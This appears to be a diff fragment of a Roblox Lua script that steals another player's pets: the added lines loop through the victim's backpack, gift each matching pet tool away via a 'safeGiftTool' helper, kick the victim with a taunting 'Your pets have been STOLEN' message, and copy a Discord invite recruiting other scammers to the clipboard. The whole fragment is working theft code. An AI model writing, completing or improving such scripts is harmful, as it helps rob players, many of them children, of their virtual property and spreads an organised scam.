+            followConn:Stop()
+            targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+            setclipboard("https://discord.gg/d2zgg2YDMz")
             break
         end
+
+        for _, tool in targetPlr.Backpack:GetChildren() do
+            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
+                print("Gifting:", tool.Name)
+                safeGiftTool(tool)
+            end
+        end
     end
 
-    if tool then
-        print("Attempting to gift", tool.Name)
-        local before = tool.Parent
-        
-        -- Run quickGift until success (it will handle its own retries)
-        quickGift(tool)
-        task.wait(0.3)
-    
-    end
-end
+    -- Stop following after gifting
+    followConn:Stop()
+    targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+    setclipboard("https://discord.gg/d2zgg2YDMz")
